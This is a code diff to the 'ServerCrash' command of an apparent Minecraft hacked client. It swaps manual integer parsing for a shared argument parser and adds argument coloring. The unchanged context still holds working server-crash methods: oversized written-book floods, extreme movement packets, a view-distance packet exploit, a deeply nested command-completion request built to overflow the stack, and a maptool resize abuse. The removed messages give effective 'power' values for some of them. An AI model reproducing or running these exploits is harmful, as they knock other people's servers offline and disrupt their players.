@@ -27,6 +27,9 @@ import net.minecraft.util.math.BlockPos;
 import net.minecraft.util.math.Direction;
 import net.minecraft.util.math.Vec3d;
 import net.shadow.client.feature.command.Command;
+import net.shadow.client.feature.command.argument.IntegerArgumentParser;
+import net.shadow.client.feature.command.coloring.ArgumentType;
+import net.shadow.client.feature.command.coloring.StaticArgumentServer;
 import net.shadow.client.feature.command.exception.CommandException;
 import net.shadow.client.feature.gui.notifications.Notification;
 
@@ -37,6 +40,11 @@ public class ServerCrash extends Command {
 
     public ServerCrash() {
         super("ServerCrash", "Crash the server using various methods", "ServerCrash", "servercrash", "Servercrash", "scrash", "qcrash");
+    }
+
+    @Override
+    public ArgumentType getArgumentType(String[] args, String lookingAtArg, int lookingAtArgIndex) {
+        return StaticArgumentServer.serveFromStatic(lookingAtArgIndex, ArgumentType.STRING, ArgumentType.NUMBER);
     }
 
     @Override
@@ -69,13 +77,7 @@ public class ServerCrash extends Command {
             }
 
             case "book" -> {
-                int size;
-                try {
-                    size = Integer.parseInt(args[1]);
-                } catch (Exception e) {
-                    Notification.create(2000, "Server Crash", Notification.Type.ERROR, "Please provide a power (around 5000 is good)");
-                    return;
-                }
+                int size = new IntegerArgumentParser().parse(args[1]);
                 for (int i = 0; i < size; i++) {
                     ItemStack crash = new ItemStack(Items.WRITTEN_BOOK, 1);
                     NbtCompound tag = new NbtCompound();
@@ -106,13 +108,7 @@ public class ServerCrash extends Command {
             }
 
             case "move" -> {
-                int size;
-                try {
-                    size = Integer.parseInt(args[1]);
-                } catch (Exception e) {
-                    Notification.create(2000, "Server Crash", Notification.Type.ERROR, "Please provide a power (around 5000 is good)");
-                    return;
-                }
+                int size = new IntegerArgumentParser().parse(args[1]);
                 for (int i = 0; i < 250; i++) {
                     client.player.networkHandler.sendPacket(new PlayerMoveC2SPacket.PositionAndOnGround(client.player.getX() + (i * size), client.player.getY(), client.player.getZ() + (i * size), true));
                 }
@@ -120,13 +116,7 @@ public class ServerCrash extends Command {
             }
 
             case "papertest" -> {
-                int peenus;
-                try {
-                    peenus = Integer.parseInt(args[1]);
-                } catch (NumberFormatException e) {
-                    Notification.create(2000, "Server Crash", Notification.Type.ERROR, "Please Provide a power (around 500 is good)");
-                    return;
-                }
+                int peenus = new IntegerArgumentParser().parse(args[1]);
                 client.player.networkHandler.sendPacket(new ClientSettingsC2SPacket("en_us", peenus, ChatVisibility.FULL, true, 127, Arm.RIGHT, false, true));
                 Notification.create(2000, "Server Crash", Notification.Type.SUCCESS, "Sent View Distance Crash");
             }
@@ -142,14 +132,8 @@ public class ServerCrash extends Command {
             }
 
             case "stackoverflow" -> {
-                int varvarvar2;
-                try {
-                    varvarvar2 = Integer.parseInt(args[1]);
-                } catch (NumberFormatException e) {
-                    Notification.create(2000, "Server Crash", Notification.Type.ERROR, "Please Provide a power (around 1600 is good)");
-                    return;
-                }
-                String popper2 = "/execute as @e" + " as @e".repeat(varvarvar2);
+                int size = new IntegerArgumentParser().parse(args[1]);
+                String popper2 = "/execute as @e" + " as @e".repeat(size);
                 client.player.networkHandler.sendPacket(new RequestCommandCompletionsC2SPacket(0, popper2));
                 Notification.create(2000, "Server Crash", Notification.Type.SUCCESS, "Sent Stackoverflow Crash");
             }
@@ -162,14 +146,8 @@ public class ServerCrash extends Command {
             }
 
             case "maptool" -> {
-                int var24 = 4;
-                try {
-                    var24 = Integer.parseInt(args[1]);
-                } catch (NumberFormatException e) {
-                    Notification.create(2000, "Server Crash", Notification.Type.ERROR, "Please Provide a power (around 100 is good)");
-                    return;
-                }
-                client.player.sendChatMessage("/maptool new https://cdn.discordapp.com/attachments/956657243812675595/963652761172455454/unknown.png resize " + var24 + " " + var24 + "");
+                int size = new IntegerArgumentParser().parse(args[1]);
+                client.player.sendChatMessage("/maptool new https://cdn.discordapp.com/attachments/956657243812675595/963652761172455454/unknown.png resize " + size + " " + size + "");
                 Notification.create(2000, "Server Crash", Notification.Type.SUCCESS, "Sent Maptool Crash");
             }
 
